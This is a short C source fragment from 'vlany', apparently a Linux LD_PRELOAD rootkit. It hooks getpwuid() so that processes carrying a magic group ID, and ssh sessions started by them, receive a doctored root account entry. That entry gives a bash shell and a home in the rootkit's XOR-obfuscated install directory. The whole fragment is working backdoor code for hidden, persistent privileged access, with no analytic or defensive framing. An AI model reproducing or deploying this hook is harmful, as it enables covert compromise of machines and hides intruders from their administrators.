struct passwd *getpwuid(uid_t uid)
{
    #ifdef PAM_DEBUG
        printf("[vlany] getpwuid() called\n");
    #endif

    HOOK(old_getpwuid, CGETPWUID);
    
    if(uid == MAGIC_GID) return old_getpwuid(0);

    char *procname = procname_self();

    if(getgid() == MAGIC_GID && uid == 0 && (!strcmp(procname, "ssh") || !strcmp(procname, "/usr/bin/ssh")))
    {
        struct passwd *vlanypw;
        vlanypw = old_getpwuid(uid);
        vlanypw->pw_uid = MAGIC_GID;
        vlanypw->pw_gid = MAGIC_GID;

        char home[64];
        char *install_dir = strdup(INSTALL_DIR); xor(install_dir);
        snprintf(home, sizeof(home), "%s", install_dir);
        CLEAN(install_dir);

        vlanypw->pw_dir = strdup(home);
        vlanypw->pw_shell = "/bin/bash";
        return vlanypw;
    }

    return old_getpwuid(uid);
}
